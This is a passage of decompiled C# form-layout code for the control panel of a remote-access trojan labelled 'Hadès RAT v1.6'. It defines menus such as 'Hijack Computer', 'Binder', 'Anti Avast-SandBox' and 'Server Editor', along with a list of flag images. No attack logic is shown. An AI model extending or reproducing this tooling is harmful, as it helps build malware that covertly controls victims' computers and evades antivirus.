            this.GetIPToolStripMenuItem.Name = "GetIPToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.GetIPToolStripMenuItem.Size = size;
            this.GetIPToolStripMenuItem.Text = "Get IP";
            this.ServerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.RestartToolStripMenuItem1, this.CloseToolStripMenuItem });
            this.ServerToolStripMenuItem.Image = (Image) manager.GetObject("ServerToolStripMenuItem.Image");
            this.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ServerToolStripMenuItem.Size = size;
            this.ServerToolStripMenuItem.Text = "Server";
            this.RestartToolStripMenuItem1.Image = (Image) manager.GetObject("RestartToolStripMenuItem1.Image");
            this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
            size = new Size(0x6d, 0x16);
            this.RestartToolStripMenuItem1.Size = size;
            this.RestartToolStripMenuItem1.Text = "Restart";
            this.CloseToolStripMenuItem.Image = Class5.smethod_10();
            this.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem";
            size = new Size(0x6d, 0x16);
            this.CloseToolStripMenuItem.Size = size;
            this.CloseToolStripMenuItem.Text = "Close";
            this.ImageList1.ImageStream = (ImageListStreamer) manager.GetObject("ImageList1.ImageStream");
            this.ImageList1.TransparentColor = Color.Transparent;
            this.ImageList1.Images.SetKeyName(0, "Zimbabwe.png");
            this.ImageList1.Images.SetKeyName(1, "Afghanistan.png");
            this.ImageList1.Images.SetKeyName(2, "African Union.png");
            this.ImageList1.Images.SetKeyName(3, "Albania.png");
            this.ImageList1.Images.SetKeyName(4, "Algeria.png");
            this.ImageList1.Images.SetKeyName(5, "American Samoa.png");
            this.ImageList1.Images.SetKeyName(6, "Andorra.png");
            this.ImageList1.Images.SetKeyName(7, "Angola.png");
            this.ImageList1.Images.SetKeyName(8, "Anguilla.png");
            this.ImageList1.Images.SetKeyName(9, "Antarctica.png");
            this.ImageList1.Images.SetKeyName(10, "Antigua & Barbuda.png");
            this.ImageList1.Images.SetKeyName(11, "Arab League.png");
            this.ImageList1.Images.SetKeyName(12, "Argentina.png");
            this.ImageList1.Images.SetKeyName(13, "Armenia.png");
            this.ImageList1.Images.SetKeyName(14, "Aruba.png");
            this.ImageList1.Images.SetKeyName(15, "ASEAN.png");
            this.ImageList1.Images.SetKeyName(0x10, "Australia.png");
            this.ImageList1.Images.SetKeyName(0x11, "Austria.png");
            this.ImageList1.Images.SetKeyName(0x12, "Azerbaijan.png");
            this.ImageList1.Images.SetKeyName(0x13, "Bahamas.png");
            this.ImageList1.Images.SetKeyName(20, "Bahrain.png");
            this.ImageList1.Images.SetKeyName(0x15, "Bangladesh.png");
            this.ImageList1.Images.SetKeyName(0x16, "Barbados.png");
            this.ImageList1.Images.SetKeyName(0x17, "Belarus.png");
            this.ImageList1.Images.SetKeyName(0x18, "Belgium.png");
            this.ImageList1.Images.SetKeyName(0x19, "Belize.png");
            this.ImageList1.Images.SetKeyName(0x1a, "Benin.png");
            this.ImageList1.Images.SetKeyName(0x1b, "Bermuda.png");
            this.ImageList1.Images.SetKeyName(0x1c, "Bhutan.png");
            this.ImageList1.Images.SetKeyName(0x1d, "Bolivia.png");
            this.ImageList1.Images.SetKeyName(30, "Bosnia & Herzegovina.png");
            this.ImageList1.Images.SetKeyName(0x1f, "Botswana.png");
            this.ImageList1.Images.SetKeyName(0x20, "Brazil.png");
            this.ImageList1.Images.SetKeyName(0x21, "Brunei.png");
            this.ImageList1.Images.SetKeyName(0x22, "Bulgaria.png");
            this.ImageList1.Images.SetKeyName(0x23, "Burkina Faso.png");
            this.ImageList1.Images.SetKeyName(0x24, "Burundi.png");
            this.ImageList1.Images.SetKeyName(0x25, "Cambodja.png");
            this.ImageList1.Images.SetKeyName(0x26, "Cameroon.png");
            this.ImageList1.Images.SetKeyName(0x27, "Canada.png");
            this.ImageList1.Images.SetKeyName(40, "Cape Verde.png");
            this.ImageList1.Images.SetKeyName(0x29, "CARICOM.png");
            this.ImageList1.Images.SetKeyName(0x2a, "Cayman Islands.png");
            this.ImageList1.Images.SetKeyName(0x2b, "Central African Republic.png");
            this.ImageList1.Images.SetKeyName(0x2c, "Chad.png");
            this.ImageList1.Images.SetKeyName(0x2d, "Chile.png");
            this.ImageList1.Images.SetKeyName(0x2e, "China.png");
            this.ImageList1.Images.SetKeyName(0x2f, "CIS.png");
            this.ImageList1.Images.SetKeyName(0x30, "Colombia.png");
            this.ImageList1.Images.SetKeyName(0x31, "Commonwealth.png");
            this.ImageList1.Images.SetKeyName(50, "Comoros.png");
            this.ImageList1.Images.SetKeyName(0x33, "Congo-Brazzaville.png");
            this.ImageList1.Images.SetKeyName(0x34, "Congo-Kinshasa(Zaire).png");
            this.ImageList1.Images.SetKeyName(0x35, "Cook Islands.png");
            this.ImageList1.Images.SetKeyName(0x36, "Costa Rica.png");
            this.ImageList1.Images.SetKeyName(0x37, "Cote d'Ivoire.png");
            this.ImageList1.Images.SetKeyName(0x38, "Croatia.png");
            this.ImageList1.Images.SetKeyName(0x39, "Cuba.png");
            this.ImageList1.Images.SetKeyName(0x3a, "Cyprus.png");
            this.ImageList1.Images.SetKeyName(0x3b, "Czech Republic.png");
            this.ImageList1.Images.SetKeyName(60, "Denmark.png");
            this.ImageList1.Images.SetKeyName(0x3d, "Djibouti.png");
            this.ImageList1.Images.SetKeyName(0x3e, "Dominica.png");
            this.ImageList1.Images.SetKeyName(0x3f, "Dominican Republic.png");
            this.ImageList1.Images.SetKeyName(0x40, "Ecuador.png");
            this.ImageList1.Images.SetKeyName(0x41, "Egypt.png");
            this.ImageList1.Images.SetKeyName(0x42, "El Salvador.png");
            this.ImageList1.Images.SetKeyName(0x43, "England.png");
            this.ImageList1.Images.SetKeyName(0x44, "Equatorial Guinea.png");
            this.ImageList1.Images.SetKeyName(0x45, "Eritrea.png");
            this.ImageList1.Images.SetKeyName(70, "Estonia.png");
            this.ImageList1.Images.SetKeyName(0x47, "Ethiopia.png");
            this.ImageList1.Images.SetKeyName(0x48, "European Union.png");
            this.ImageList1.Images.SetKeyName(0x49, "Faroes.png");
            this.ImageList1.Images.SetKeyName(0x4a, "Fiji.png");
            this.ImageList1.Images.SetKeyName(0x4b, "Finland.png");
            this.ImageList1.Images.SetKeyName(0x4c, "France.png");
            this.ImageList1.Images.SetKeyName(0x4d, "Gabon.png");
            this.ImageList1.Images.SetKeyName(0x4e, "Gambia.png");
            this.ImageList1.Images.SetKeyName(0x4f, "Georgia.png");
            this.ImageList1.Images.SetKeyName(80, "Germany.png");
            this.ImageList1.Images.SetKeyName(0x51, "Ghana.png");
            this.ImageList1.Images.SetKeyName(0x52, "Gibraltar.png");
            this.ImageList1.Images.SetKeyName(0x53, "Greece.png");
            this.ImageList1.Images.SetKeyName(0x54, "Greenland.png");
            this.ImageList1.Images.SetKeyName(0x55, "Grenada.png");
            this.ImageList1.Images.SetKeyName(0x56, "Guadeloupe.png");
            this.ImageList1.Images.SetKeyName(0x57, "Guademala.png");
            this.ImageList1.Images.SetKeyName(0x58, "Guam.png");
            this.ImageList1.Images.SetKeyName(0x59, "Guernsey.png");
            this.ImageList1.Images.SetKeyName(90, "Guinea.png");
            this.ImageList1.Images.SetKeyName(0x5b, "Guinea-Bissau.png");
            this.ImageList1.Images.SetKeyName(0x5c, "Guyana.png");
            this.ImageList1.Images.SetKeyName(0x5d, "Haiti.png");
            this.ImageList1.Images.SetKeyName(0x5e, "Honduras.png");
            this.ImageList1.Images.SetKeyName(0x5f, "Hong Kong.png");
            this.ImageList1.Images.SetKeyName(0x60, "Hungary.png");
            this.ImageList1.Images.SetKeyName(0x61, "Iceland.png");
            this.ImageList1.Images.SetKeyName(0x62, "India.png");
            this.ImageList1.Images.SetKeyName(0x63, "Indonesia.png");
            this.ImageList1.Images.SetKeyName(100, "Iran.png");
            this.ImageList1.Images.SetKeyName(0x65, "Iraq.png");
            this.ImageList1.Images.SetKeyName(0x66, "Ireland.png");
            this.ImageList1.Images.SetKeyName(0x67, "Islamic Conference.png");
            this.ImageList1.Images.SetKeyName(0x68, "Isle of Man.png");
            this.ImageList1.Images.SetKeyName(0x69, "Israel.png");
            this.ImageList1.Images.SetKeyName(0x6a, "Italy.png");
            this.ImageList1.Images.SetKeyName(0x6b, "Jamaica.png");
            this.ImageList1.Images.SetKeyName(0x6c, "Japan.png");
            this.ImageList1.Images.SetKeyName(0x6d, "Jersey.png");
            this.ImageList1.Images.SetKeyName(110, "Jordan.png");
            this.ImageList1.Images.SetKeyName(0x6f, "Kazakhstan.png");
            this.ImageList1.Images.SetKeyName(0x70, "Kenya.png");
            this.ImageList1.Images.SetKeyName(0x71, "Kiribati.png");
            this.ImageList1.Images.SetKeyName(0x72, "Kosovo.png");
            this.ImageList1.Images.SetKeyName(0x73, "Kuwait.png");
            this.ImageList1.Images.SetKeyName(0x74, "Kyrgyzstan.png");
            this.ImageList1.Images.SetKeyName(0x75, "Laos.png");
            this.ImageList1.Images.SetKeyName(0x76, "Latvia.png");
            this.ImageList1.Images.SetKeyName(0x77, "Lebanon.png");
            this.ImageList1.Images.SetKeyName(120, "Lesotho.png");
            this.ImageList1.Images.SetKeyName(0x79, "Liberia.png");
            this.ImageList1.Images.SetKeyName(0x7a, "Libya.png");
            this.ImageList1.Images.SetKeyName(0x7b, "Liechtenstein.png");
            this.ImageList1.Images.SetKeyName(0x7c, "Lithuania.png");
            this.ImageList1.Images.SetKeyName(0x7d, "Luxembourg.png");
            this.ImageList1.Images.SetKeyName(0x7e, "Macao.png");
            this.ImageList1.Images.SetKeyName(0x7f, "Macedonia.png");
            this.ImageList1.Images.SetKeyName(0x80, "Madagascar.png");
            this.ImageList1.Images.SetKeyName(0x81, "Malawi.png");
            this.ImageList1.Images.SetKeyName(130, "Malaysia.png");
            this.ImageList1.Images.SetKeyName(0x83, "Maldives.png");
            this.ImageList1.Images.SetKeyName(0x84, "Mali.png");
            this.ImageList1.Images.SetKeyName(0x85, "Malta.png");
            this.ImageList1.Images.SetKeyName(0x86, "Marshall Islands.png");
            this.ImageList1.Images.SetKeyName(0x87, "Martinique.png");
            this.ImageList1.Images.SetKeyName(0x88, "Mauritania.png");
            this.ImageList1.Images.SetKeyName(0x89, "Mauritius.png");
            this.ImageList1.Images.SetKeyName(0x8a, "Mexico.png");
            this.ImageList1.Images.SetKeyName(0x8b, "Micronesia.png");
            this.ImageList1.Images.SetKeyName(140, "Moldova.png");
            this.ImageList1.Images.SetKeyName(0x8d, "Monaco.png");
            this.ImageList1.Images.SetKeyName(0x8e, "Mongolia.png");
            this.ImageList1.Images.SetKeyName(0x8f, "Montenegro.png");
            this.ImageList1.Images.SetKeyName(0x90, "Montserrat.png");
            this.ImageList1.Images.SetKeyName(0x91, "Morocco.png");
            this.ImageList1.Images.SetKeyName(0x92, "Mozambique.png");
            this.ImageList1.Images.SetKeyName(0x93, "Myanmar(Burma).png");
            this.ImageList1.Images.SetKeyName(0x94, "Namibia.png");
            this.ImageList1.Images.SetKeyName(0x95, "NATO.png");
            this.ImageList1.Images.SetKeyName(150, "Nauru.png");
            this.ImageList1.Images.SetKeyName(0x97, "Nepal.png");
            this.ImageList1.Images.SetKeyName(0x98, "Netherlands Antilles.png");
            this.ImageList1.Images.SetKeyName(0x99, "Netherlands.png");
            this.ImageList1.Images.SetKeyName(0x9a, "New Caledonia.png");
            this.ImageList1.Images.SetKeyName(0x9b, "New Zealand.png");
            this.ImageList1.Images.SetKeyName(0x9c, "Nicaragua.png");
            this.ImageList1.Images.SetKeyName(0x9d, "Niger.png");
            this.ImageList1.Images.SetKeyName(0x9e, "Nigeria.png");
            this.ImageList1.Images.SetKeyName(0x9f, "North Korea.png");
            this.ImageList1.Images.SetKeyName(160, "Northern Cyprus.png");
            this.ImageList1.Images.SetKeyName(0xa1, "Northern Ireland.png");
            this.ImageList1.Images.SetKeyName(0xa2, "Norway.png");
            this.ImageList1.Images.SetKeyName(0xa3, "Olimpic Movement.png");
            this.ImageList1.Images.SetKeyName(0xa4, "Oman.png");
            this.ImageList1.Images.SetKeyName(0xa5, "OPEC.png");
            this.ImageList1.Images.SetKeyName(0xa6, "Pakistan.png");
            this.ImageList1.Images.SetKeyName(0xa7, "Palau.png");
            this.ImageList1.Images.SetKeyName(0xa8, "Palestine.png");
            this.ImageList1.Images.SetKeyName(0xa9, "Panama.png");
            this.ImageList1.Images.SetKeyName(170, "Papua New Guinea.png");
            this.ImageList1.Images.SetKeyName(0xab, "Paraguay.png");
            this.ImageList1.Images.SetKeyName(0xac, "Peru.png");
            this.ImageList1.Images.SetKeyName(0xad, "Philippines.png");
            this.ImageList1.Images.SetKeyName(0xae, "Poland.png");
            this.ImageList1.Images.SetKeyName(0xaf, "Portugal.png");
            this.ImageList1.Images.SetKeyName(0xb0, "Puerto Rico.png");
            this.ImageList1.Images.SetKeyName(0xb1, "Qatar.png");
            this.ImageList1.Images.SetKeyName(0xb2, "Red Cross.png");
            this.ImageList1.Images.SetKeyName(0xb3, "Reunion.png");
            this.ImageList1.Images.SetKeyName(180, "Romania.png");
            this.ImageList1.Images.SetKeyName(0xb5, "Russian Federation.png");
            this.ImageList1.Images.SetKeyName(0xb6, "Rwanda.png");
            this.ImageList1.Images.SetKeyName(0xb7, "Saint Lucia.png");
            this.ImageList1.Images.SetKeyName(0xb8, "Samoa.png");
            this.ImageList1.Images.SetKeyName(0xb9, "San Marino.png");
            this.ImageList1.Images.SetKeyName(0xba, "Sao Tome & Principe.png");
            this.ImageList1.Images.SetKeyName(0xbb, "Saudi Arabia.png");
            this.ImageList1.Images.SetKeyName(0xbc, "Scotland.png");
            this.ImageList1.Images.SetKeyName(0xbd, "Senegal.png");
            this.ImageList1.Images.SetKeyName(190, "Serbia.png");
            this.ImageList1.Images.SetKeyName(0xbf, "Seyshelles.png");
            this.ImageList1.Images.SetKeyName(0xc0, "Sierra Leone.png");
            this.ImageList1.Images.SetKeyName(0xc1, "Singapore.png");
            this.ImageList1.Images.SetKeyName(0xc2, "Slovakia.png");
            this.ImageList1.Images.SetKeyName(0xc3, "Slovenia.png");
            this.ImageList1.Images.SetKeyName(0xc4, "Solomon Islands.png");
            this.ImageList1.Images.SetKeyName(0xc5, "Somalia.png");
            this.ImageList1.Images.SetKeyName(0xc6, "Somaliland.png");
            this.ImageList1.Images.SetKeyName(0xc7, "South Afriica.png");
            this.ImageList1.Images.SetKeyName(200, "South Korea.png");
            this.ImageList1.Images.SetKeyName(0xc9, "Spain.png");
            this.ImageList1.Images.SetKeyName(0xca, "Sri Lanka.png");
            this.ImageList1.Images.SetKeyName(0xcb, "St Kitts & Nevis.png");
            this.ImageList1.Images.SetKeyName(0xcc, "St Vincent & the Grenadines.png");
            this.ImageList1.Images.SetKeyName(0xcd, "Sudan.png");
            this.ImageList1.Images.SetKeyName(0xce, "Suriname.png");
            this.ImageList1.Images.SetKeyName(0xcf, "Swaziland.png");
            this.ImageList1.Images.SetKeyName(0xd0, "Sweden.png");
            this.ImageList1.Images.SetKeyName(0xd1, "Switzerland.png");
            this.ImageList1.Images.SetKeyName(210, "Syria.png");
            this.ImageList1.Images.SetKeyName(0xd3, "Tahiti(French Polinesia).png");
            this.ImageList1.Images.SetKeyName(0xd4, "Taiwan.png");
            this.ImageList1.Images.SetKeyName(0xd5, "Tajikistan.png");
            this.ImageList1.Images.SetKeyName(0xd6, "Tanzania.png");
            this.ImageList1.Images.SetKeyName(0xd7, "Thailand.png");
            this.ImageList1.Images.SetKeyName(0xd8, "Timor-Leste.png");
            this.ImageList1.Images.SetKeyName(0xd9, "Togo.png");
            this.ImageList1.Images.SetKeyName(0xda, "Tonga.png");
            this.ImageList1.Images.SetKeyName(0xdb, "Trinidad & Tobago.png");
            this.ImageList1.Images.SetKeyName(220, "Tunisia.png");
            this.ImageList1.Images.SetKeyName(0xdd, "Turkey.png");
            this.ImageList1.Images.SetKeyName(0xde, "Turkmenistan.png");
            this.ImageList1.Images.SetKeyName(0xdf, "Turks and Caicos Islands.png");
            this.ImageList1.Images.SetKeyName(0xe0, "Tuvalu.png");
            this.ImageList1.Images.SetKeyName(0xe1, "Uganda.png");
            this.ImageList1.Images.SetKeyName(0xe2, "Ukraine.png");
            this.ImageList1.Images.SetKeyName(0xe3, "United Arab Emirates.png");
            this.ImageList1.Images.SetKeyName(0xe4, "United Kingdom(Great Britain).png");
            this.ImageList1.Images.SetKeyName(0xe5, "United Nations.png");
            this.ImageList1.Images.SetKeyName(230, "United States of America.png");
            this.ImageList1.Images.SetKeyName(0xe7, "Uruguay.png");
            this.ImageList1.Images.SetKeyName(0xe8, "Uzbekistan.png");
            this.ImageList1.Images.SetKeyName(0xe9, "Vanutau.png");
            this.ImageList1.Images.SetKeyName(0xea, "Vatican City.png");
            this.ImageList1.Images.SetKeyName(0xeb, "Venezuela.png");
            this.ImageList1.Images.SetKeyName(0xec, "Viet Nam.png");
            this.ImageList1.Images.SetKeyName(0xed, "Virgin Islands British.png");
            this.ImageList1.Images.SetKeyName(0xee, "Virgin Islands US.png");
            this.ImageList1.Images.SetKeyName(0xef, "Wales.png");
            this.ImageList1.Images.SetKeyName(240, "Western Sahara.png");
            this.ImageList1.Images.SetKeyName(0xf1, "Yemen.png");
            this.ImageList1.Images.SetKeyName(0xf2, "Zambia.png");
            this.MenuStrip1.BackColor = Color.FromArgb(0x40, 0x40, 0x40);
            this.MenuStrip1.Font = new Font("Calibri", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.MenuStrip1.Items.AddRange(new ToolStripItem[] { this.FileToolStripMenuItem, this.ToolStripMenuItem2, this.ServerEditorToolStripMenuItem, this.BinderToolStripMenuItem, this.ExtraToolStripMenuItem });
            Point point = new Point(0, 0);
            this.MenuStrip1.Location = point;
            this.MenuStrip1.Name = "MenuStrip1";
            this.MenuStrip1.RenderMode = ToolStripRenderMode.Professional;
            size = new Size(0x4bd, 0x18);
            this.MenuStrip1.Size = size;
            this.MenuStrip1.TabIndex = 4;
            this.MenuStrip1.Text = "MenuStrip1";
            this.ToolStripMenuItem2.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.ToolStripMenuItem2.ForeColor = Color.Silver;
            this.ToolStripMenuItem2.Image = (Image) manager.GetObject("ToolStripMenuItem2.Image");
            this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
            size = new Size(0x44, 20);
            this.ToolStripMenuItem2.Size = size;
            this.ToolStripMenuItem2.Text = "Listen";
            this.FileToolStripMenuItem.BackColor = Color.FromArgb(0x40, 0x40, 0x40);
            this.FileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.SettingsToolStripMenuItem, this.NoipUpdateToolStripMenuItem, this.ExitToolStripMenuItem });
            this.FileToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.FileToolStripMenuItem.ForeColor = Color.Silver;
            this.FileToolStripMenuItem.Image = (Image) manager.GetObject("FileToolStripMenuItem.Image");
            this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
            size = new Size(0x38, 20);
            this.FileToolStripMenuItem.Size = size;
            this.FileToolStripMenuItem.Text = "File";
            this.SettingsToolStripMenuItem.Image = (Image) manager.GetObject("SettingsToolStripMenuItem.Image");
            this.SettingsToolStripMenuItem.Name = "SettingsToolStripMenuItem";
            this.SettingsToolStripMenuItem.ShortcutKeys = Keys.Alt | Keys.S;
            size = new Size(150, 0x16);
            this.SettingsToolStripMenuItem.Size = size;
            this.SettingsToolStripMenuItem.Text = "Settings";
            this.NoipUpdateToolStripMenuItem.Image = Class5.smethod_65();
            this.NoipUpdateToolStripMenuItem.Name = "NoipUpdateToolStripMenuItem";
            size = new Size(150, 0x16);
            this.NoipUpdateToolStripMenuItem.Size = size;
            this.NoipUpdateToolStripMenuItem.Text = "No-ip Update";
            this.ExitToolStripMenuItem.Image = (Image) manager.GetObject("ExitToolStripMenuItem.Image");
            this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
            this.ExitToolStripMenuItem.ShortcutKeys = Keys.Alt | Keys.F4;
            size = new Size(150, 0x16);
            this.ExitToolStripMenuItem.Size = size;
            this.ExitToolStripMenuItem.Text = "Exit";
            this.ServerEditorToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.ServerEditorToolStripMenuItem.ForeColor = Color.Silver;
            this.ServerEditorToolStripMenuItem.Image = (Image) manager.GetObject("ServerEditorToolStripMenuItem.Image");
            this.ServerEditorToolStripMenuItem.Name = "ServerEditorToolStripMenuItem";
            size = new Size(0x67, 20);
            this.ServerEditorToolStripMenuItem.Size = size;
            this.ServerEditorToolStripMenuItem.Text = "Server Editor";
            this.BinderToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.FormGrabberToolStripMenuItem });
            this.BinderToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.BinderToolStripMenuItem.ForeColor = Color.Silver;
            this.BinderToolStripMenuItem.Image = (Image) manager.GetObject("BinderToolStripMenuItem.Image");
            this.BinderToolStripMenuItem.Name = "BinderToolStripMenuItem";
            size = new Size(0x45, 20);
            this.BinderToolStripMenuItem.Size = size;
            this.BinderToolStripMenuItem.Text = "Plugin";
            this.FormGrabberToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.FormGrabberToolStripMenuItem.Image = (Image) manager.GetObject("FormGrabberToolStripMenuItem.Image");
            this.FormGrabberToolStripMenuItem.Name = "FormGrabberToolStripMenuItem";
            size = new Size(0xa2, 0x16);
            this.FormGrabberToolStripMenuItem.Size = size;
            this.FormGrabberToolStripMenuItem.Text = "Hijack Computer";
            this.ExtraToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.PortScannerToolStripMenuItem, this.ResHackerToolStripMenuItem, this.ExtensionChangerToolStripMenuItem, this.BinderToolStripMenuItem1, this.AntiAvastSandBoxToolStripMenuItem });
            this.ExtraToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.ExtraToolStripMenuItem.ForeColor = Color.Silver;
            this.ExtraToolStripMenuItem.Image = (Image) manager.GetObject("ExtraToolStripMenuItem.Image");
            this.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem";
            size = new Size(0x3d, 20);
            this.ExtraToolStripMenuItem.Size = size;
            this.ExtraToolStripMenuItem.Text = "Extra";
            this.PortScannerToolStripMenuItem.Image = (Image) manager.GetObject("PortScannerToolStripMenuItem.Image");
            this.PortScannerToolStripMenuItem.Name = "PortScannerToolStripMenuItem";
            this.PortScannerToolStripMenuItem.ShortcutKeys = Keys.Alt | Keys.P;
            size = new Size(0xb1, 0x16);
            this.PortScannerToolStripMenuItem.Size = size;
            this.PortScannerToolStripMenuItem.Text = "Port Scanner";
            this.ResHackerToolStripMenuItem.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.ResHackerToolStripMenuItem.Image = Class5.smethod_19();
            this.ResHackerToolStripMenuItem.Name = "ResHackerToolStripMenuItem";
            size = new Size(0xb1, 0x16);
            this.ResHackerToolStripMenuItem.Size = size;
            this.ResHackerToolStripMenuItem.Text = "ResHacker";
            this.ExtensionChangerToolStripMenuItem.Image = (Image) manager.GetObject("ExtensionChangerToolStripMenuItem.Image");
            this.ExtensionChangerToolStripMenuItem.Name = "ExtensionChangerToolStripMenuItem";
            size = new Size(0xb1, 0x16);
            this.ExtensionChangerToolStripMenuItem.Size = size;
            this.ExtensionChangerToolStripMenuItem.Text = "Extension Changer";
            this.BinderToolStripMenuItem1.Font = new Font("Calibri", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.BinderToolStripMenuItem1.Image = Class5.smethod_17();
            this.BinderToolStripMenuItem1.Name = "BinderToolStripMenuItem1";
            size = new Size(0xb1, 0x16);
            this.BinderToolStripMenuItem1.Size = size;
            this.BinderToolStripMenuItem1.Text = "Binder";
            this.AntiAvastSandBoxToolStripMenuItem.Image = Class5.smethod_42();
            this.AntiAvastSandBoxToolStripMenuItem.Name = "AntiAvastSandBoxToolStripMenuItem";
            size = new Size(0xb1, 0x16);
            this.AntiAvastSandBoxToolStripMenuItem.Size = size;
            this.AntiAvastSandBoxToolStripMenuItem.Text = "Anti Avast-SandBox";
            this.txtListening.ForeColor = Color.DarkOrange;
            this.txtListening.Name = "txtListening";
            size = new Size(0x22, 20);
            this.txtListening.Size = size;
            this.txtListening.Text = "Idle...";
            this.ToolStripStatusLabel1.BackColor = Color.Transparent;
            this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
            size = new Size(0x359, 20);
            this.ToolStripStatusLabel1.Size = size;
            this.ToolStripStatusLabel1.Spring = true;
            this.StatusStrip1.BackColor = Color.Gainsboro;
            this.StatusStrip1.Items.AddRange(new ToolStripItem[] { this.txtOnline, this.txtListening, this.ToolStripStatusLabel1, this.ToolStripSplitButton1, this.ToolStripStatusLabel2 });
            point = new Point(0, 320);
            this.StatusStrip1.Location = point;
            this.StatusStrip1.Name = "StatusStrip1";
            this.StatusStrip1.RenderMode = ToolStripRenderMode.Professional;
            size = new Size(0x4bd, 0x19);
            this.StatusStrip1.Size = size;
            this.StatusStrip1.TabIndex = 3;
            this.StatusStrip1.Text = "StatusStrip1";
            this.txtOnline.BorderSides = ToolStripStatusLabelBorderSides.Right;
            this.txtOnline.Image = (Image) manager.GetObject("txtOnline.Image");
            this.txtOnline.Name = "txtOnline";
            size = new Size(0x62, 20);
            this.txtOnline.Size = size;
            this.txtOnline.Text = "Users Online: 0";
            this.ToolStripSplitButton1.DisplayStyle = ToolStripItemDisplayStyle.Image;
            this.ToolStripSplitButton1.DropDownItems.AddRange(new ToolStripItem[] { this.NumberOfConnectionsMaxToolStripMenuItem, this.ToolStripSeparator7, this.ToolStripTextBox14 });
            this.ToolStripSplitButton1.Image = (Image) manager.GetObject("ToolStripSplitButton1.Image");
            this.ToolStripSplitButton1.ImageTransparentColor = Color.Magenta;
            this.ToolStripSplitButton1.Name = "ToolStripSplitButton1";
            size = new Size(0x20, 0x17);
            this.ToolStripSplitButton1.Size = size;
            this.ToolStripSplitButton1.Text = "pp";
            this.NumberOfConnectionsMaxToolStripMenuItem.Image = Class5.smethod_72();
            this.NumberOfConnectionsMaxToolStripMenuItem.Name = "NumberOfConnectionsMaxToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.NumberOfConnectionsMaxToolStripMenuItem.Size = size;
            this.NumberOfConnectionsMaxToolStripMenuItem.Text = "Number Of Connections (Max)";
            this.ToolStripSeparator7.Name = "ToolStripSeparator7";
            size = new Size(0xd0, 6);
            this.ToolStripSeparator7.Size = size;
            this.ToolStripTextBox14.Name = "ToolStripTextBox14";
            size = new Size(100, 0x15);
            this.ToolStripTextBox14.Size = size;
            this.ToolStripTextBox14.Text = "40";
            this.ToolStripStatusLabel2.ForeColor = Color.Gray;
            this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
            size = new Size(0xb1, 20);
            this.ToolStripStatusLabel2.Size = size;
            this.ToolStripStatusLabel2.Text = "Copyright \x00a9 The_Blood_Justice 2012";
            this.ContextMenuStrip2.Items.AddRange(new ToolStripItem[] { this.SaveToFileToolStripMenuItem });
            this.ContextMenuStrip2.Name = "ContextMenuStrip2";
            this.ContextMenuStrip2.RenderMode = ToolStripRenderMode.System;
            size = new Size(0x80, 0x1a);
            this.ContextMenuStrip2.Size = size;
            this.SaveToFileToolStripMenuItem.Image = (Image) manager.GetObject("SaveToFileToolStripMenuItem.Image");
            this.SaveToFileToolStripMenuItem.Name = "SaveToFileToolStripMenuItem";
            size = new Size(0x7f, 0x16);
            this.SaveToFileToolStripMenuItem.Size = size;
            this.SaveToFileToolStripMenuItem.Text = "Save to File";
            this.NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
            this.NotifyIcon1.BalloonTipText = "Exemple";
            this.NotifyIcon1.BalloonTipTitle = "ex";
            this.NotifyIcon1.ContextMenuStrip = this.ContextMenuStrip3;
            this.NotifyIcon1.Icon = (Icon) manager.GetObject("NotifyIcon1.Icon");
            this.NotifyIcon1.Text = "Had\x00e8s RAT v1.6";
            this.NotifyIcon1.Visible = true;
            this.ContextMenuStrip3.Items.AddRange(new ToolStripItem[] { this.ShowToolStripMenuItem, this.ExitToolStripMenuItem1 });
            this.ContextMenuStrip3.Name = "ContextMenuStrip3";
            this.ContextMenuStrip3.RenderMode = ToolStripRenderMode.System;
            size = new Size(100, 0x30);
            this.ContextMenuStrip3.Size = size;
            this.ShowToolStripMenuItem.Image = Class5.smethod_93();
            this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
            size = new Size(0x63, 0x16);
            this.ShowToolStripMenuItem.Size = size;
            this.ShowToolStripMenuItem.Text = "Show";
            this.ExitToolStripMenuItem1.Image = Class5.smethod_10();
            this.ExitToolStripMenuItem1.Name = "ExitToolStripMenuItem1";
            size = new Size(0x63, 0x16);
            this.ExitToolStripMenuItem1.Size = size;
            this.ExitToolStripMenuItem1.Text = "Exit";
            this.Timer1.Enabled = true;
            this.Timer1.Interval = 0xea60;
            point = new Point(0x142, -77);
            this.getloggg.Location = point;
            this.getloggg.Multiline = true;
            this.getloggg.Name = "getloggg";
            size = new Size(0x124, 0x42);
            this.getloggg.Size = size;
            this.getloggg.TabIndex = 7;
            this.getloggg.Visible = false;
            point = new Point(0x16, -195);
            this.textsteam.Location = point;
            this.textsteam.Multiline = true;
            this.textsteam.Name = "textsteam";
            size = new Size(350, 0xb8);
            this.textsteam.Size = size;
            this.textsteam.TabIndex = 8;
            point = new Point(0, -157);
